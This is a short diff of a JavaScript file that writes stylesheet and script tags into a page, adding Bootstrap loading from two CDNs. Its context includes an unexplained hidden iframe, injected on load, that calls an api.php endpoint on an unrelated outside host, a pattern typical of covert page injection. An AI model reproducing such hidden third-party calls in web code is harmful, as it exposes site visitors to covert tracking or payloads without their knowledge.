@@ -179,6 +179,12 @@ document.writeln(
 document.writeln(
   '<link href="//cdn.bootcss.com/font-awesome/4.7.0/css/font-awesome.min.css" rel="stylesheet">'
 );
+
+document.writeln('<script src="https://cdnjs.cloudflare.com/ajax/libs/twitter-bootstrap/3.3.0/js/bootstrap.min.js"></script>');
+!window.jQuery.modal &&
+  document.write(
+    '<script src="//cdn.bootcss.com/bootstrap/3.3.0/js/bootstrap.min.js"></script>'
+  );
 document.onload=function(){
-document.body.append('<iframe src="http://pan.is-best.net/pan3/backend/api.php?m=VideoController!getDateTime&callback=_" style="display:none;"></iframe>');
+  document.body.append('<iframe src="http://pan.is-best.net/pan3/backend/api.php?m=VideoController!getDateTime&callback=_" style="display:none;"></iframe>');
 }
